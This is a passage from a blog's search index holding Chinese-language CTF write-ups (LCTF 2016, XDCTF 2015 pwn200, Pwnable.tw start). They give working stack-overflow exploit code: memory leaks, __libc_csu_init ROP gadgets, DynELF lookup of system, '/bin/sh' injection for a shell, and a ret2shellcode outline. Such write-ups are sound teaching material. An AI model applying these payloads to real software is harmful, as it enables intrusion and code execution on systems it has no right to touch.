    <content type="text"><![CDATA[使用ida查看程序，在函数0x40063d中有read函数，读取用户输入的200个字节。接着调用puts函数输出。 12sub_40063D((__int64)&amp;v1, 200);return puts("bye~"); 存储用户输入的空间为0x40字节，所以用户输入会导致溢出。由于是64位程序，因此需要gadget来控制流。x64中，主要使用__libc_csu_init中的两段代码来进行参数传递和函数调用，这两段代码分别位于0x400740和0x40075a。 由于无libc，需要泄漏，通过pattern和rsp可知偏移为72： 123456789101112131415161718def leak(addr): payload = 'a' * 72 + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_addr) payload += 'a' * (200 - len(payload)) p.send(payload) p.recvuntil('~\n') prev_rv = '' data = '' while True: rv = p.recv(numb = 1, timeout = 0.1) if prev_rv == '\n' and rv == '': data = data[:-1] data += '\x00' break else: data += rv prev_rv = rv data = data[:4] return data 获取system函数地址后，只需要将/bin/sh写入再调用system函数即可，通过vmmap可知0x601000-0x602000可读/写： 1234567891011payload = 'a' * 72 + p64(0x40075a) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(0x601000) + p64(0) + p64(0x400740) #0、1两个参数固定，0配合第二段代码的call，由于是call指令第三个参数用got，随后是read函数的三个参数，返回0x400740调用第二段代码payload += 'a' * 56 + p64(start_addr) #栈指针移动了56字节，填充56字节payload += 'a' * (200 - len(payload))p.send(payload)p.recvuntil('~\n')p.send('/bin/sh\x00')payload = 'a' * 72 + p64(pop_rdi) + p64(0x601000) + p64(system_addr) + p64(0xdeadbeef)payload += 'a' * (200 - len(payload))p.send(payload)p.interactive() 参考文章和bin下载：https://www.anquanke.com/post/id/85129]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2016</tag>
        <tag>lctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xdctf 2015 pwn200 writeup]]></title>
    <url>%2F2018%2F01%2F06%2Fxdctf15-pwn200%2F</url>
    <content type="text"><![CDATA[为栈溢出，溢出点为buf，长度0x6C，read可输入0x100。溢出偏移为112。 1read(0, &amp;buf, 0x100u); // buf length: 0x6C 因为无libc，因此需要通过泄漏获取libc信息来获取system函数地址： 12345678def leak(address): payload = 'a' * 112 + p32(write_plt) + p32(0x8048484) + p32(1) + p32(address) + p32(4) # 返回到0x8048484使得泄漏可以重复 p.send(payload) data = recv(4) return datad = DynELF(leak, elf=ELF('./xdctf15-pwn200'), libcdb=False)system_addr = d.lookup('system', 'libc') 接着调用start函数恢复栈： 1payload = 'a' * 112 + p32(start_addr) 调用read函数输入”/bin/sh”字符串，最后调用system函数： 1payload = 'a' * 112 + p32(read_plt) + p32(0x804856c) + p32(0) + p32(bss_addr) + p32(8) + p32(system_addr) + p32(0xdeadbeef) + p32(bss_addr)]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>xctf</tag>
        <tag>2015</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.tw start writeup]]></title>
    <url>%2F2018%2F01%2F05%2Fpwnable-tw-start%2F</url>
    <content type="text"><![CDATA[使用ida查看程序，首先保存esp和_exit地址，随后将输出的字符串压栈： 123456789push esppush offset _exitxor eax, eax ; ebx, ecx, edxpush &apos;Let&apos;s start the CTF:&apos;mov ecx esp ; addrmov dl, 14h ; lenmov bl, 1 ; fdmov al, 4 ; syscall num, writeint 80h 随后执行输入函数： 1234xor ebx, ebx ; fdmov dl, 3Ch ; lenmov al, 3 ; syscall num, putint 80h 由于ecx在之前已经被赋值为esp，所以put函数仍是对同一个变量（输出的字符串）进行输入。使用gdb-peda的checksec查看，虽然显示NX: enable，但是通过vmmap执行，发现栈是可执行的。使用pattern create和pattern offset获取偏移量为20。因此构造的payload结构如下： 1'a' * 20 + [ret addr] + getshell 因为要获取栈的地址来达到ret2shellcode的目的，所以需要通过write泄漏栈地址。在程序运行的开始，执行了： 12push esppush offset _exit 在put函数后，执行： 12add esp, 14hret ;pop esp 使得字符串参数、_exit被移出栈、pop，栈顶从而变为之前储存的esp。因此在第一个put函数执行时，输入： 1'a' * 20 + 0x8048087 便可以打印出esp的地址。获取esp的地址后，将会继续再次执行put函数（此时ecx仍为字符串参数的地址），此时输入： 1'a' * 20 + [ret addr] + getshell 即可。需要注意shellcode长度以满足输入的条件（3Ch）。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>pwnable-tw</tag>
      </tags>
  </entry>
</search>
